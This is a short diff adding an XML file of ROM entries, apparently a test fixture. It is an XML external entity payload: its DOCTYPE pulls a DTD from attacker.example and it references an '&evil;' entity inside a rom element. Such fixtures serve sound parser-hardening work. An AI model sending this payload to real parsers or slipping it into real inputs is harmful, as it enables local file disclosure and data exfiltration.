@@ -1,0 +1,5 @@
+<?xml version="1.0"?>
+<!DOCTYPE roms SYSTEM "http://attacker.example/evil.dtd">
+<roms>
+  <rom>&evil;</rom>
+</roms>
